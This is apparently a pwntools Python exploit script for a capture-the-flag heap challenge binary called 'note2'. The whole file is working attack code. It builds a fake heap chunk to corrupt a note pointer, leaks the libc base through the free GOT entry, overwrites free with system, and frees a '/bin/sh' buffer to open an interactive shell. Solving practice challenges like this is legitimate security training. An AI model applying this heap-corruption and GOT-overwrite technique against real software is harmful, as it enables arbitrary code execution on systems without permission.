#!/usr/bin/env python3



from pwn import *


e = ELF("./note2")
libc = ELF("./libc.so.6")
r = process("./note2")
r.sendlineafter(b"name:",b"Ajay")
r.sendlineafter(b"address:",b"Kallikuppam")

def malloc(size,data):
    r.sendlineafter(b"option--->>",b"1")
    r.sendlineafter(b"Input the length of the note content:(less than 128)",f"{size}")
    r.sendlineafter(b"Input the note content:",data)

def show(index):
    r.sendlineafter(b"option--->>",b"2")
    r.sendlineafter(b"Input the id of the note:",f"{index}")
    r.recvuntil(b"Content is ")
    leak = u64(r.recvuntil(b"\x7f").strip().decode('latin-1').ljust(8,'\x00'))
    return leak

def edit(index,choice,data):
    r.sendlineafter(b"option--->>",b"3")
    r.sendlineafter(b"Input the id of the note:",f"{index}")
    r.sendlineafter(b"do you want to overwrite or append?[1.overwrite/2.append]",f"{choice}")
    r.sendafter(b"TheNewContents:",data)

def delete(index):
    r.sendlineafter(b"option--->>",b"4")
    r.sendlineafter(b"Input the id of the note:",f"{index}")

malloc(128,p64(0) + p64(0xa1) + p64(0x602108) + p64(0x602110))
malloc(0,b"B" * 23)
malloc(128,b"C" * 8)
delete(1)
malloc(0,b"/bin/sh\x00" + b"B" * 8 + p64(0xa0) + p64(0x90))
delete(2)
edit(0,1,b"A" * 24 + p64(e.got.free) + b"\n") 
libc_base = show(0) - libc.sym.free
log.info("The libc base of the process is " + hex(libc_base))
edit(0,1,p64(libc_base + libc.sym.system) + p64(0x400f4a) + b"\n")
delete(3)
r.interactive()




